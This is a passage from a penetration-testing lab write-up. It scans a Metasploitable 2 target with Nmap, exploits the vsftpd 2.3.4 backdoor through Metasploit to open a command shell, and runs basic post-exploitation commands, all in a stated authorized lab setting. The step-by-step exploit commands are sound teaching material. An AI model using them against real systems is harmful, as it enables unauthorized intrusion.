2. Nmap Scanning
Perform a basic scan:

nmap <Metasploitable_IP>

Perform a SYN scan:

nmap -sS <Metasploitable_IP>

Detect service versions:

nmap -sV <Metasploitable_IP>

Detect the operating system:

nmap -O <Metasploitable_IP>

Perform a combined scan:

nmap -sS -sV -O <Metasploitable_IP>

Identify open ports and vulnerable services from the scan results.

3. Metasploit Exploitation

Start Metasploit:

msfconsole

Search for the vsftpd vulnerability:

search vsftpd

Load the exploit:

use exploit/unix/ftp/vsftpd_234_backdoor

Set the target IP:

set RHOST <Metasploitable_IP>

Set the FTP port:

set RPORT 21

Run the exploit:

exploit

If successful, a command shell session is opened.

4. Post-Exploitation

Check the current user:

whoami

Display system information:

uname -a

Display network configuration:

ifconfig
Result

The experiment demonstrated network scanning using Nmap and controlled exploitation of the vulnerable vsftpd service using Metasploit on Metasploitable 2.

Conclusion

Nmap was used to identify open ports, services, and the operating system of the target machine. Metasploit was then used to perform controlled exploitation of the vulnerable vsftpd service in the authorized laboratory environment.
